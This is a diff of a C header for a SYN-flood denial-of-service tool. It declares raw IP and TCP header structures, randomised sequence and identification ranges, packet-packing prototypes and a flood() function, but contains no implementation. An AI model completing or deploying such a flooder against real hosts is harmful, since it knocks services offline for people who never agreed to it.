@@ -1,16 +1,23 @@
 #ifndef DOS_SYN
 #define DOS_SYN
-#include <sys/socket.h>
-#include <netinet/ip.h>
-#include <netinet/in.h>
-#include <arpa/inet.h>
 #include <stdlib.h>
 #include <string.h>
+#include <time.h>
+#include <unistd.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <netinet/ip.h>
+#include <arpa/inet.h>
+#include <errno.h>
 
-#define PAYLOAD_SIZE (20 + 20)
+#define PAYLOAD_SIZE (0x14 + 0x14)
+#define IP_HEADER_SIZE 0x14
+#define TCP_HEADER_SIZE 0x14
+#define TCP_PSEUDO_HEADER_SIZE 0xc
+#define PROTOCOL_NUMBER 0x6
 #define MAX_RANDOM_RANGE 0xffff
 #define MAX_RANDOM_IDENTIFICATION 0xffff
-#define MAX_RANDOM_SEQUENCE 0xffffffff
+#define MAX_RANDOM_SEQUENCE 0xffff
 
 typedef struct {
     unsigned char version;
@@ -61,7 +68,7 @@ typedef struct {
 } Payload;
 
 typedef struct {
-    void *buffer;
+    unsigned char *buffer;
     unsigned short index;
     unsigned char ip_length;
     unsigned char tcp_length;
@@ -78,11 +85,15 @@ typedef struct {
 } DoS_SYN_args;
 
 unsigned int init_socket(void);
+void init_buffer(Buffer *buf);
+void init_ipv4_header_structure(IPv4_Header *ip, DoS_SYN_args *args);
+void init_tcp_header_structure(TCP_Header *tcp, DoS_SYN_args *args);
+void init_tcp_pseudo_header_structure(TCP_Pseudo_Header *pseudo, DoS_SYN_args *args);
 void pack_ipv4_header(Buffer *buf, Payload *payload);
 void pack_tcp_header(Buffer *buf, Payload *payload);
 void pack_tcp_pseudo_header(unsigned char *buf, Payload *payload);
 unsigned int push_payload(int sockfd, Buffer *buf, Payload *payload, struct sockaddr_in *addr);
-void free_buffer(Buffer *buf);
+void free_buffer();
 unsigned int flood(DoS_SYN_args *args);
 
 #endif
